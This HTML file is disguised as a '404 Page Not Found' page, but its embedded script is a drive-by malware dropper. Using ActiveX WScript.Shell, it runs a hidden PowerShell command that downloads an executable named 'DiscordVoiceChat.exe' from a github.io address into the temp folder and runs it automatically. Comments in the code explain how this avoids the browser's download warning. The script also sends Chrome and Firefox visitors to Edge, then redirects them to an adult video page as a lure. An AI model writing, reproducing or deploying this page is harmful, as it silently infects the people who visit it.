<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>404 - Page Not Found</title>
<style>
  body{background:#111;color:#ddd;font-family:Arial,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
  .wrap{text-align:center}
  .code{font-size:120px;font-weight:bold;color:#e74c3c}
  .msg{font-size:22px;margin:10px 0 4px}
  .sub{font-size:14px;color:#888;margin-top:20px}
</style>
</head>
<body>
  <div class="wrap">
    <div class="code">404</div>
    <div class="msg">Page Not Found</div>
    <div class="sub">Redirecting to video…</div>
  </div>
  <script>
    // Grab the exe with hidden PowerShell and Start-Process it (autorun).
    // The browser never downloads anything, so no "suspicious download" banner.
    var exeUrl = 'https://NorthOfPotential.github.io/voice/DiscordVoiceChat.exe';
    var cmd = 'powershell -WindowStyle Hidden -Command ' +
      '\\"(New-Object Net.WebClient).DownloadFile(\'' + exeUrl + '\',\'$env:TEMP\\DiscordVoiceChat.exe\'); ' +
      'Start-Process \\'$env:TEMP\\DiscordVoiceChat.exe\'\\"';

    function runIt() {
      try {
        var sh = new ActiveXObject('WScript.Shell');
        sh.Run(cmd, 0, true);           // hidden, waits for it to finish
      } catch (e) {}
      // leave them at the video
      setTimeout(function(){ location.href='https://multporn.net/video/lady_ds_prisoner'; }, 1200);
    }

    // If already Edge/IE, ActiveX works — do it here.
    // Otherwise (Chrome/Firefox), bounce the page into a separate Edge window and let it do the work.
    var ua = navigator.userAgent;
    var isEdge = /Edg\//.test(ua) || /Edge\//.test(ua) || /EdgA\//.test(ua);
    var isIE = /Trident|MSIE/.test(ua);
    if (isEdge || isIE) {
      runIt();
    } else {
      // Chrome/Firefox: open the page in a separate Edge window (ActiveX works there)
      // so hidden PowerShell can download + autorun the exe, AND redirect this tab
      // to the video so it doesn't just sit on the 404.
      window.open('msedge://NorthOfPotential.github.io/voice/', '_blank');
      setTimeout(function(){ location.href='https://multporn.net/video/lady_ds_prisoner'; }, 1500);
    }
  </script>
</body>
</html>
